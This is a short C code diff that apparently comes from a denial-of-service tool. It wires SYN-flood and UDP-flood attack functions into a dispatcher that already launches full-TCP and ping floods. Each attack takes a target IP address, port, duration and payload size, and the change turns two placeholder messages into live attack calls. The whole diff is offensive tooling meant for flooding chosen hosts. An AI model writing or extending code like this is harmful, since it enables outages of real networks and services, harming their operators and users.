@@ -3,7 +3,10 @@
 
 #include "MgArguments.h"
 #include "AttackFloodFullTCP.h"
+#include "AttackFloodUDP.h"
 #include "AttackFloodPing.h"
+#include "AttackDOS.h"
+#include "AttackFloodTcpSyn.h"
 
 UCHAR GenRandChar() {
 	return rand() % 256;
@@ -27,13 +30,13 @@ BOOL CopyRandBufferAlloc(UCHAR** pBuffer, UINT bufferSize) {
 BOOL AttackDos(DosStruct dosStruct) {
 	switch (dosStruct.attackType) {
 	case  TCP_FLOOD_SYN:
-		printf("[d] Underdevelopment !!!\n\n");
+		AttackFloodTcpSyn(dosStruct.ipAddress, dosStruct.port, dosStruct.time, dosStruct.dataSize, FALSE);
 		break;
 	case  TCP_FLOOD_FULL:
 		AttackFloodFullTcp(dosStruct.ipAddress, dosStruct.port, dosStruct.time, dosStruct.dataSize, FALSE);
 		break;
 	case  UDP_FLOOD:
-		printf("[d] Underdevelopment !!!\n\n");
+		AttackFloodUDP(dosStruct.ipAddress, dosStruct.port, dosStruct.time, dosStruct.dataSize, FALSE);
 		break;
 	case  PING_FLOOD:
 		AttackFloodPing(dosStruct.ipAddress, dosStruct.dataSize, dosStruct.time);
